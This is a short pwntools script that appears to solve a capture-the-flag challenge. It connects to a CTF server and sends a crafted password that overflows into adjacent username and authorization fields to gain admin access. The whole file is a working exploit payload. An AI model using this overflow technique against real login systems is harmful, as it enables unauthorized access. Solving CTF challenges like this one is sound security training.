from pwn import *
context.log_level = "error"
    
r = remote("authorized-access-only.chall.uiactf.no", 1337)
r.recvuntil(b"Username: ")
r.sendline(b"admin")
r.recvuntil(b"Password: ")
r.sendline(b"l37 m3 3n73r plz!XXXXXXXXXXXXXXXadminXXXXXXXXXXXXXXXXXtrue\x00")
print(r.recvall().strip().decode())